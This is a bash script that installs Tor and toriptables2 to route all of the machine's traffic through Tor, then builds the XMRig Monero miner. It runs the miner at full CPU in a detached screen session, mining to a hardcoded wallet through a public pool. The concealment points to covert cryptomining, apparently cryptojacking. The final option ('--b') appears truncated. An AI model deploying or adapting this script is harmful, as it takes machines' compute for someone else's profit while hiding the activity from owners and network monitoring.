#!/bin/bash
apt-get update
apt-get install -y libmicrohttpd-dev libssl-dev cmake python build-essential libhwloc-dev screen git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libgmp-dev libuv1-dev tor python
git clone https://github.com/ruped24/toriptables2.git
cd toriptables2/
mv toriptables2.py /usr/local/bin/
cd
git clone https://github.com/xmrig/xmrig.git
systemctl start tor
toriptables2.py -l

cd xmrig
mkdir build
cd build
cmake ..
make
sysctl -w vm.nr_hugepages=128
screen torify ./xmrig --no-color --donate-level 1 --max-cpu-usage 100 --cpu-priority 5 -a cryptonight -k --tls -o pool.supportxmr.com:9000 -u 42iZdPFRQPN1qpHG6niqkG6cY3oZph9Vn9JZvKZ1Guce7UVWj587z7TJ15fW85FDQHNU9Wiqe3qGXfP2VNHq4xa9MK5LUrU -p x3 --b
